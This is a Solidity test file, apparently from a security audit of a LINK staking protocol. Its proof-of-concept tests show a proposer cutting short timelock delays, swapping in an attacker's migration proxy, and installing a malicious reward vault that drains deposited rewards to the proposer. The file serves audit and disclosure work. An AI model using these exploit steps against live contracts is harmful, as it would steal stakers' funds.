// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import {BaseTestTimelocked} from '../BaseTestTimelocked.t.sol';
import {MigrationProxy} from '../../src/MigrationProxy.sol';
import {StakingPoolBase} from '../../src/pools/StakingPoolBase.sol';
import {Timelock} from '../../src/timelock/Timelock.sol';
import {MigrationProxyAttack} from '../MigrationProxy.Attacker.sol';
import {RewardVault} from '../../src/rewards/RewardVault.sol';
import {AttackRewardVault} from '../AttackRewardVault.sol';
import {IRewardVault} from '../../src/interfaces/IRewardVault.sol';
import {PriceFeedAlertsController} from '../../src/alerts/PriceFeedAlertsController.sol';
import {MockV3Aggregator} from '../mocks/MockV3Aggregator.sol';
import {OperatorStakingPool} from '../../src/pools/OperatorStakingPool.sol';
import {ISlashable} from '../../src/interfaces/ISlashable.sol';
import {console} from 'forge-std/console.sol';
import {IAccessControlDefaultAdminRules} from
  '@openzeppelin/contracts/access/IAccessControlDefaultAdminRules.sol';

contract MyIntergrationTests is BaseTestTimelocked {
  MigrationProxy private s_newMigrationProxy;
  Timelock.Call[] private s_timelockUpgradeCalls;

  function setUp() public override {
    BaseTestTimelocked.setUp();
  }

  function test_TheTimeLockSystemDoesnotWorkAsExpected() public {
    // first proposer proposes to change the unbonding time to 30 days
    changePrank(PROPOSER_ONE);
    Timelock.Call[] memory firstCalls = new Timelock.Call[](1);
    uint256 unbondingTime = 30 days;
    uint256 delay = 31 days;

    // setting 30 days as the new unbonding time for the staking pool
    firstCalls[0] = Timelock.Call({
      target: address(s_communityStakingPool),
      value: 0,
      data: abi.encodeWithSelector(StakingPoolBase.setUnbondingPeriod.selector, unbondingTime)
    });

    // scheduling the first call
    s_stakingTimelock.scheduleBatch(firstCalls, NO_PREDECESSOR, EMPTY_SALT, delay);

    // could be proposed on the same day. Only doing just for clarity
    skip(1 days);

    // After one day proposer makes another call to change the unbonding time to 2 days
    Timelock.Call[] memory secondCalls = new Timelock.Call[](1);
    uint256 newUnbondingTime = 2 days;

    secondCalls[0] = Timelock.Call({
      target: address(s_communityStakingPool),
      value: 0,
      data: abi.encodeWithSelector(StakingPoolBase.setUnbondingPeriod.selector, newUnbondingTime)
    });

    // scheduling the second call
    s_stakingTimelock.scheduleBatch(secondCalls, NO_PREDECESSOR, EMPTY_SALT, delay + 1 days);

    // skipping 31 days to execute the first call
    skip(delay + 1 days);
    changePrank(EXECUTOR_ONE);
    s_stakingTimelock.executeBatch(firstCalls, NO_PREDECESSOR, EMPTY_SALT);

    // checking the unbonding time after the first call
    (uint256 unboundingTimeAfterCall1,) = s_communityStakingPool.getUnbondingParams();
    assertEq(unboundingTimeAfterCall1, unbondingTime);

    // skipping 2 days to execute the second call
    skip(2 days);
    s_stakingTimelock.executeBatch(secondCalls, NO_PREDECESSOR, EMPTY_SALT);

    // checking the unbonding time after the second call
    (uint256 unboundingTimeAfterCall2,) = s_communityStakingPool.getUnbondingParams();
    assertEq(unboundingTimeAfterCall2, newUnbondingTime);
  }

  // @audit test not going to work as the executor will be the one who will give access to the
  // satking pool not the timelock. It's a valid
  function test_MigrationProxyCanRecieveTheAlerterFundButTheirIsNotAWayToWithdrawThem() public {
    changePrank(REWARDER);
    uint256 alerterReward = 1000 ether;
    s_LINK.transfer(address(s_stakingTimelock), alerterReward);

    uint256 balanceBefore = s_LINK.balanceOf(address(s_stakingTimelock));
    assertEq(balanceBefore, alerterReward);

    // proposer proposes to transfer the amounts to operator staking pool
    changePrank(PROPOSER_ONE);
    Timelock.Call[] memory calls = new Timelock.Call[](2);

    calls[0] = Timelock.Call({
      target: address(s_operatorStakingPool),
      value: 0,
      data: abi.encodeWithSelector(
        s_LINK.approve.selector, address(s_operatorStakingPool), alerterReward
        )
    });

    calls[1] = Timelock.Call({
      target: address(s_operatorStakingPool),
      value: 0,
      data: abi.encodeWithSelector(s_operatorStakingPool.depositAlerterReward.selector, alerterReward)
    });

    changePrank(PROPOSER_ONE);
    s_stakingTimelock.scheduleBatch(calls, NO_PREDECESSOR, EMPTY_SALT, MIN_DELAY);

    skip(MIN_DELAY);

    changePrank(EXECUTOR_ONE);
    s_stakingTimelock.executeBatch(calls, NO_PREDECESSOR, EMPTY_SALT);

    uint256 balanceAfter = s_LINK.balanceOf(address(s_stakingTimelock));
    assertEq(balanceAfter, 0);
    assertEq(s_operatorStakingPool.getAlerterRewardFunds(), alerterReward);
  }

  function test_TheTimeLockSystemDoesnotWorkAsExpectedMigraionProxyCanBeChanged() public {
    // first proposer proposes to change the unbonding time to 30 days
    changePrank(PROPOSER_ONE);
    Timelock.Call[] memory firstCalls = new Timelock.Call[](1);
    MigrationProxy newMigrationProxyAddress = new MigrationProxy(
      MigrationProxy.ConstructorParams({
        LINKAddress: s_LINK,
        v01StakingAddress: MOCK_STAKING_V01,
        operatorStakingPool: s_operatorStakingPool,
        communityStakingPool: s_communityStakingPool,
        adminRoleTransferDelay: ADMIN_ROLE_TRANSFER_DELAY
      })
    );

    uint256 delay = 31 days;

    // setting 30 days as the new unbonding time for the staking pool
    firstCalls[0] = Timelock.Call({
      target: address(s_communityStakingPool),
      value: 0,
      data: abi.encodeWithSelector(
        StakingPoolBase.setMigrationProxy.selector, address(newMigrationProxyAddress)
        )
    });

    // scheduling the first call
    s_stakingTimelock.scheduleBatch(firstCalls, NO_PREDECESSOR, EMPTY_SALT, delay);

    // could be proposed on the same day. Only doing just for clarity
    skip(1 hours);

    // After one day proposer makes another call to change the unbonding time to 2 days
    Timelock.Call[] memory secondCalls = new Timelock.Call[](1);
    MigrationProxyAttack attackMigrationProxy = new MigrationProxyAttack(
      MigrationProxyAttack.ConstructorParams({
        LINKAddress: s_LINK,
        v01StakingAddress: MOCK_STAKING_V01,
        operatorStakingPool: s_operatorStakingPool,
        communityStakingPool: s_communityStakingPool,
        adminRoleTransferDelay: ADMIN_ROLE_TRANSFER_DELAY
      })
    );

    secondCalls[0] = Timelock.Call({
      target: address(s_communityStakingPool),
      value: 0,
      data: abi.encodeWithSelector(
        StakingPoolBase.setMigrationProxy.selector, address(attackMigrationProxy)
        )
    });

    // scheduling the second call
    s_stakingTimelock.scheduleBatch(secondCalls, NO_PREDECESSOR, EMPTY_SALT, delay);

    // skipping 30 days to execute the first call
    skip(delay);
    changePrank(EXECUTOR_ONE);
    s_stakingTimelock.executeBatch(firstCalls, NO_PREDECESSOR, EMPTY_SALT);

    // checking if the migration proxy is actually set to new migration proxy
    address migrationProxy = s_communityStakingPool.getMigrationProxy();
    assertEq(migrationProxy, address(newMigrationProxyAddress));

    // skipping 2 days to execute the second call
    skip(2 hours);
    s_stakingTimelock.executeBatch(secondCalls, NO_PREDECESSOR, EMPTY_SALT);

    // checking if the migration proxy is actually set to attack migration proxy
    migrationProxy = s_communityStakingPool.getMigrationProxy();
    assertEq(migrationProxy, address(attackMigrationProxy));
  }

  // @audit test passed
  function test_SponsorsCanSetMaliciusRewardVaultAgainWithoutGoingThroughDelay() public {
    changePrank(PROPOSER_ONE);
    Timelock.Call[] memory firstCalls = new Timelock.Call[](1);

    // creating new rewardVault that is not malicious
    RewardVault s_newRewardVault = new RewardVault(
      RewardVault.ConstructorParams({
        linkToken: s_LINK,
        communityStakingPool: s_communityStakingPool,
        operatorStakingPool: s_operatorStakingPool,
        delegationRateDenominator: DELEGATION_RATE_DENOMINATOR,
        initialMultiplierDuration: INITIAL_MULTIPLIER_DURATION,
        adminRoleTransferDelay: ADMIN_ROLE_TRANSFER_DELAY
      })
    );

    // setting the new reward vault to put in proposals
    firstCalls[0] = Timelock.Call({
      target: address(s_communityStakingPool),
      value: 0,
      data: abi.encodeWithSelector(StakingPoolBase.setRewardVault.selector, address(s_newRewardVault))
    });

    uint256 delay = 31 days;
    // scheduling the first call
    s_stakingTimelock.scheduleBatch(firstCalls, NO_PREDECESSOR, EMPTY_SALT, delay);

    // after scheculing another Batch the sponsor sets the reward vault to the malicious one
    changePrank(PROPOSER_ONE);
    Timelock.Call[] memory secondCalls = new Timelock.Call[](1);

    // PROPOSER_ONE deploys new malicious reward vault
    // vault can be exactly same only one function is required to drain the funds
    AttackRewardVault maliciousVault = new AttackRewardVault(
      AttackRewardVault.ConstructorParams({
        linkToken: s_LINK,
        communityStakingPool: s_communityStakingPool,
        operatorStakingPool: s_operatorStakingPool,
        delegationRateDenominator: DELEGATION_RATE_DENOMINATOR,
        initialMultiplierDuration: INITIAL_MULTIPLIER_DURATION,
        adminRoleTransferDelay: ADMIN_ROLE_TRANSFER_DELAY
      })
    );

    // setting the new reward vault to put in proposals
    secondCalls[0] = Timelock.Call({
      target: address(s_communityStakingPool),
      value: 0,
      data: abi.encodeWithSelector(StakingPoolBase.setRewardVault.selector, address(maliciousVault))
    });

    // scheduling the second call
    s_stakingTimelock.scheduleBatch(secondCalls, NO_PREDECESSOR, EMPTY_SALT, delay);

    // skipping 31 days to execute the first call
    skip(delay);
    changePrank(EXECUTOR_ONE);
    s_stakingTimelock.executeBatch(firstCalls, NO_PREDECESSOR, EMPTY_SALT);

    // checking if the reward vault is actually set to new reward vault
    IRewardVault rewardVault = s_communityStakingPool.getRewardVault();
    assertEq(address(rewardVault), address(s_newRewardVault));

    // without any delay the sponsor executes the second call
    s_stakingTimelock.executeBatch(secondCalls, NO_PREDECESSOR, EMPTY_SALT);
    rewardVault = s_communityStakingPool.getRewardVault();
    assertEq(address(rewardVault), address(maliciousVault));

    // rewarder sends reward to the newly set malicious reward vault
    changePrank(REWARDER);
    uint256 rewardAmount = 1000 ether;
    s_LINK.transfer(address(maliciousVault), rewardAmount);

    // checking the balance of maliciousVault. Should be equal to rewardAmount
    uint256 balance = s_LINK.balanceOf(address(maliciousVault));
    assertEq(balance, rewardAmount);

    // proposer saw that there are new rewards in the contract and call this malicious function
    // `takeOutAllTheFunds` and take out all the funds
    changePrank(PROPOSER_ONE);

    // proposer balance before calling the function
    uint256 proposerBalanceBefore = s_LINK.balanceOf(address(PROPOSER_ONE));
    maliciousVault.takeOutAllTheFunds();

    // checking the balance of maliciousVault. Should be equal be zero
    balance = s_LINK.balanceOf(address(maliciousVault));
    assertEq(balance, 0);

    // checking the balance of proposer. Should be equal to previous balance + rewardAmount
    uint256 proposerBalanceAfter = s_LINK.balanceOf(address(PROPOSER_ONE));
    assertEq(proposerBalanceAfter, proposerBalanceBefore + rewardAmount);
  }

  // @audit test passed
  function test_CannotRaiseAlertInCaseOfAlertThresholdIsVeryLarge() public {
    uint256 delay = 31 days;
    uint32 priorityPeriodThresholdMax = type(uint32).max;
    uint32 regularPeriodThresholdMax = type(uint32).max;
    uint32 normalPriorityPeriodThreshold = 2 hours + 40 minutes;
    uint32 normalRegularPeriodThreshold = 3 hours;
    uint32 roundIdCounter = 0;

    changePrank(address(this));
    // deploying new price feeds and alerts controller
    (PriceFeedAlertsController priceAlerterController, MockV3Aggregator priceFeed1) =
    _deployNewPriceFeedAlertsController(normalPriorityPeriodThreshold, normalRegularPeriodThreshold);
    (uint80 roundId,,, uint256 updatedAt,) = priceFeed1.latestRoundData();

    // checks to make sure that the roundId and updatedAt is fresh
    assertEq(updatedAt, block.timestamp - delay);
    assertEq(roundId, ++roundIdCounter);

    // giving the role of slasher to the operator staking pool
    // proposing to add the slahser role
    changePrank(PROPOSER_ONE);

    // creating slasher config
    ISlashable.SlasherConfig memory slasherConfig =
      ISlashable.SlasherConfig({refillRate: 1 ether, slashCapacity: 1000 ether});

    // adding the slasher role to the operator staking pool
    Timelock.Call[] memory calls = new Timelock.Call[](1);
    calls[0] = Timelock.Call({
      target: address(s_operatorStakingPool),
      value: 0,
      data: abi.encodeWithSelector(
        s_operatorStakingPool.addSlasher.selector, address(priceAlerterController), slasherConfig
        )
    });

    // scheduling and executing the answer
    _scheduleAndExecuteTheCall(calls, delay);

    // updating the answer
    (roundId, updatedAt) = _updateAnswer(priceFeed1);
    assertEq(roundId, ++roundIdCounter);
    assertEq(updatedAt, block.timestamp);

    // should revert when the data is fresh
    vm.expectRevert(abi.encodeWithSelector(PriceFeedAlertsController.AlertInvalid.selector));
    priceAlerterController.raiseAlert(address(priceFeed1));

    skip(normalPriorityPeriodThreshold);

    // slasher should habve balance in the pool
    uint256 balance = s_operatorStakingPool.getStakerPrincipal(address(OPERATOR_STAKER_ONE));
    assert(balance > 0);

    // should be able to raise the alert when data has not been updated for
    // normalPriorityPeriodThreshold
    changePrank(OPERATOR_STAKER_ONE);
    priceAlerterController.raiseAlert(address(priceFeed1));

    // setting the feed config again with max values
    PriceFeedAlertsController.SetFeedConfigParams[] memory feedsToUpdate =
      new PriceFeedAlertsController.SetFeedConfigParams[](1);

    feedsToUpdate[0] = PriceFeedAlertsController.SetFeedConfigParams({
      feed: address(priceFeed1),
      priorityPeriodThreshold: priorityPeriodThresholdMax,
      regularPeriodThreshold: regularPeriodThresholdMax,
      slashableAmount: 100 ether,
      alerterRewardAmount: 10 ether
    });

    // updating the feed config to max values
    calls = new Timelock.Call[](1);
    calls[0] = Timelock.Call({
      target: address(priceAlerterController),
      value: 0,
      data: abi.encodeWithSelector(PriceFeedAlertsController.setFeedConfigs.selector, feedsToUpdate)
    });

    _scheduleAndExecuteTheCall(calls, delay);

    // updating the answers of alert feeds so it can become fresh again
    (roundId, updatedAt) = _updateAnswer(priceFeed1);
    assertEq(roundId, ++roundIdCounter);
    assertEq(updatedAt, block.timestamp);

    // should revert even if a lot of time has been passed
    skip(1000 days);
    vm.expectRevert(abi.encodeWithSelector(PriceFeedAlertsController.AlertInvalid.selector));
    priceAlerterController.raiseAlert(address(priceFeed1));
  }

  function _deployNewPriceFeedAlertsController(
    uint32 normalPriorityPeriodThreshold,
    uint32 normalRegularPeriodThreshold
  ) public returns (PriceFeedAlertsController, MockV3Aggregator) {
    // deploying new price feeds
    MockV3Aggregator priceFeed1 = new MockV3Aggregator(8, 1000000000000000000);

    // setting slashable operators
    address[] memory slashableOperators = new address[](2);
    slashableOperators[0] = OPERATOR_STAKER_ONE;
    slashableOperators[1] = OPERATOR_STAKER_TWO;

    // deploying the price alerter controller

    PriceFeedAlertsController.ConstructorFeedConfigParams[] memory newFeeds =
      new PriceFeedAlertsController.ConstructorFeedConfigParams[](1);
    newFeeds[0] = PriceFeedAlertsController.ConstructorFeedConfigParams({
      feed: address(priceFeed1),
      priorityPeriodThreshold: normalPriorityPeriodThreshold,
      regularPeriodThreshold: normalRegularPeriodThreshold,
      slashableAmount: 100 ether,
      alerterRewardAmount: 10 ether,
      slashableOperators: slashableOperators
    });

    PriceFeedAlertsController priceAlerterController = new PriceFeedAlertsController(
      PriceFeedAlertsController.ConstructorParams({
        communityStakingPool: s_communityStakingPool,
        operatorStakingPool: s_operatorStakingPool,
        feedConfigs: newFeeds,
        adminRoleTransferDelay: ADMIN_ROLE_TRANSFER_DELAY
      })
    );

    priceAlerterController.beginDefaultAdminTransfer(address(s_stakingTimelock));

    // transferring the owner to timelock
    changePrank(PROPOSER_ONE);
    Timelock.Call[] memory calls = new Timelock.Call[](1);
    calls[0] = _timelockCall(
      address(priceAlerterController),
      abi.encodeWithSelector(IAccessControlDefaultAdminRules.acceptDefaultAdminTransfer.selector)
    );

    _scheduleAndExecuteTheCall(calls, 31 days);

    return (priceAlerterController, priceFeed1);
  }

  function _scheduleAndExecuteTheCall(Timelock.Call[] memory calls, uint256 delay) public {
    changePrank(PROPOSER_ONE);
    // scheduling the call
    s_stakingTimelock.scheduleBatch(calls, NO_PREDECESSOR, EMPTY_SALT, delay);

    // skipping upto delay to execute the call
    skip(delay);
    changePrank(EXECUTOR_ONE);
    s_stakingTimelock.executeBatch(calls, NO_PREDECESSOR, EMPTY_SALT);
  }

  function _updateAnswer(MockV3Aggregator priceFeed1) internal returns (uint80, uint256) {
    // updating the answers of alert feeds so it can become fresh again
    priceFeed1.updateAnswer(10 * 10 ** 8);

    // getting the updated data
    (uint80 roundId,,, uint256 updatedAt,) = priceFeed1.latestRoundData();
    return (roundId, updatedAt);
  }
}
